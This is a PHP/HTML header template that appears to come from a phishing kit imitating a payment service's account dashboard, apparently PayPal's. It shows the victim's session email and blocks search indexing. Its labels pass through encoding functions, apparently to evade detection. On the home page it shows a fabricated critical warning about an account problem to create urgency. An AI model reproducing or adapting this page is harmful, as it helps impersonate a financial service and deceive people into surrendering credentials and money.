<!DOCTYPE html>
<html>

<head>
  <title><?=$api->transcode($title);?></title>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
  <link rel="shortcut icon" href="../assets/img/favicon.ico">
  <link rel="apple-touch-icon" href="../assets/img/apple-touch-icon.png">
  <link rel="stylesheet" href="../assets/css/myaccount_app.css">
  <link rel="stylesheet" href="../assets/css/myaccount_sumarry.css">
  <link rel="stylesheet" href="../assets/css/myaccount_wallet.css">
  <link rel="stylesheet" href="../assets/css/myaccount_main.css">
  <script src="../assets/js/jquery.min.js"></script>
  <script src="../assets/js/jquery.validate.js"></script>
</head>

<body id="kuzuluy">
<div class="vx_globalNav-main globalNav_main js_globalNavView">
<div class="vx_globalNav-container">
<a href="#" class="vx_globalNav-brand_desktop">
<span class="vx_a11yText"><?=$api->encode("Sumarry");?></span>
</a>
<div class="vx_globalNav-secondaryNav_mobile">
<div class="vx_globalNav-listItem_mobileLogout">
<a href="#" id="logout1" class="vx_globalNav-link_mobileLogout"><?=$api->encode("Log Out");?></a>
</div>
<div class="vx_globalNav-listItem_settings">
<a href="#" class="vx_globalNav-link_settings">
<span class="vx_globalNav-iconWrapper_secondary">
<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings"></span>
</span>
<span class="vx_a11yText"><?=$api->encode("Settings");?></span>
</a>
</div>
<div>
<p class="vx_h5 vx_globalNav-displayName">
<?=$api->encode($_SESSION['email']);?>
</p>
</div>
</div>
<div class="vx_globalNav-navContainer">
<nav class="vx_globalNav-nav">
<ul class="vx_globalNav-list">
<li>
<a href="#" class="vx_isActive vx_globalNav-links nemo_globalNavSummaryLink">
<span class="vx_globalNav-iconWrapper">
<span class="vx_globalNav-navIcon globalNav-icon_linkSummary"></span>
</span>
<span class="vx_globalNav-navText"><?=$api->encode("Sumarry");?></span>
</a>
</li>
<li>
<a href="#" class="vx_globalNav-links nemo_globalNavActivityLink">
<span class="vx_globalNav-iconWrapper">
<span class="vx_globalNav-navIcon globalNav-icon_linkActivity"></span>
</span>
<span class="vx_globalNav-navText"><?=$api->encode("Activity");?></span>
</a>
</li>
<li>
<a href="#" class="vx_globalNav-links nemo_globalNavTransferLink">
<span class="vx_globalNav-iconWrapper">
<span class="vx_globalNav-navIcon globalNav-icon_linkTransfer"></span>
</span>
<span class="vx_globalNav-navText"><?=$api->encode("Send & Request");?></span>
</a>
</li>
<li>
<a href="#" class="vx_globalNav-links nemo_globalNavWalletLink">
<span class="vx_globalNav-iconWrapper">
<span class="vx_globalNav-navIcon globalNav-icon_linkWallet"></span>
</span>
<span class="vx_globalNav-navText"><?=$api->encode("Wallet");?></span>
</a>
</li>
<li>
<a href="#" class="vx_globalNav-links nemo_globalNavShopLink">
<span class="vx_globalNav-iconWrapper">
<span class="vx_globalNav-navIcon globalNav-icon_linkShop"></span>
</span>
<span class="vx_globalNav-navText"><?=$api->encode("Shop");?></span>
</a>
</li>
<li class="globalNav-listItem_mobile js_globalNavSearch">
<a href="#" class="vx_globalNav-links nemo_globalNavSearchLink js_globalNavSearchLink">
<span class="vx_globalNav-navText"><?=$api->encode("Search");?></span>
</a>
</li>
</ul>
<ul class="vx_globalNav-list_secondary">
<li class="vx_globalNav-actionItem_mobile globalNav_notificationItem vx_globalNav-notificationItem_mobile js_notificationButtonView nemo_headerNotifications">
<a href="#" class="vx_globalNav-link_notifications notifications_desktop js_notifications-toggleTrigger nemo_notificationsDesktopTrigger">
<span class="vx_globalNav-iconWrapper_secondary">
<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkNotifications"></span>
<span class="vx_notificationCount notificationLength-1 js_notificationCount"><?=$api->encode($notification);?></span>
</span>
<span class="vx_globalNav-navText_secondary vx_globalNav-navText_secondaryMobile vx_a11yText"><?=$api->encode("Notifications");?></span>
</a>
</li>
<li>
<a href="#" class="vx_globalNav-link_settings">
<span class="vx_globalNav-iconWrapper_secondary">
<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings"></span>
</span>
<span class="vx_globalNav-navText_secondary vx_a11yText"><?=$api->encode("Settings");?></span>
</a>
</li>
<li class="globalNav-listItem_mobile">
<a href="#" class="vx_globalNav-link_help">
<span class="vx_globalNav-iconWrapper_secondary">
<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkHelp"></span>
</span>
<span class="vx_globalNav-navText_secondary vx_a11yText"><?=$api->encode("Help");?></span>
</a>
</li>
<li class="vx_globalNav-listItem_logout"><a href="#" id="logout2" class="vx_globalNav-link_logout nemo_logoutBtn"><?=$api->encode("Log Out");?></a>
</li>
</ul>
</nav>
</div>
</div>
</div>
<div class="vx_sidepanel sidepanel js_sidepanelView noPrint panel js_globalNotifs-sidepanel">
<div class="vx_sidepanel-headerContainer">
<h3 class="vx_h3 vx_sidepanel-header" style="color:#FFFFFF"><?=$api->encode("Notifications");?></h3>
<div class="vx_sidepanel-headerIcon_right">
<a href="#" class="globalNotifs-close js_closeNotifications">
<span class="icon icon-small icon-close-small"></span>
<span class="vx_a11yText"><?=$api->encode("Close Notifications");?></span>
</a>
</div>
</div>
<?php
if ($page == "home") {
  echo '
<div class="vx_sidepanel-body">
<ul class="vx_sidepanel-list">
<li>
<a class="vx_sidepanel-item">
<p class="globalNotifs-message" style="color:#FFFFFF">
<span class="icon icon-small icon-critical-small globalNotifs-levelIndicator_critical" style="color:#f24246;"></span>
'.$api->transcode("There's a problem with your account. Make sure to resolve it so you have full access to your account immediately.").'
</p>
</a>
</li>
</ul>
</div>';
}
?>
</div>
<div class="vx_foreground-container foreground-container">
<div class="vx_globalNav-main_mobile js_globalNavView">
<div class="vx_globalNav-headerSection_trigger">
<a href="#navMenu" class="js_toggleMobileMenu vx_globalNav-toggleTrigger nemo_mobileNavMenuToggle noPrint"><?=$api->encode("Menu");?></a>
</div>
<div class="vx_globalNav-headerSection_logo">
<a href="#" class="vx_globalNav-brand_mobile">
<span class="vx_a11yText"><?=$api->encode("Summary");?></span>
</a>
</div>
<ul class="vx_globalNav-headerSection_actions">
<li class="vx_globalNav-actionItem_mobile globalNav_notificationItem vx_globalNav-notificationItem_mobile js_notificationButtonView nemo_headerNotifications">
<a href="#" class="vx_globalNav-link_notifications notifications_mobile js_notifications-toggleTrigger nemo_notificationsMobileTrigger">
<span class="vx_globalNav-iconWrapper_secondary">
<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkNotifications"></span>
<span class="vx_notificationCount notificationLength-1 js_notificationCount"><?=$api->encode($notification); ?></span>
</span>
<span class="vx_globalNav-navText_secondary vx_globalNav-navText_secondaryMobile vx_a11yText"><?=$api->encode("Notifications"); ?></span>
</a>
</li>
</ul>
</div>
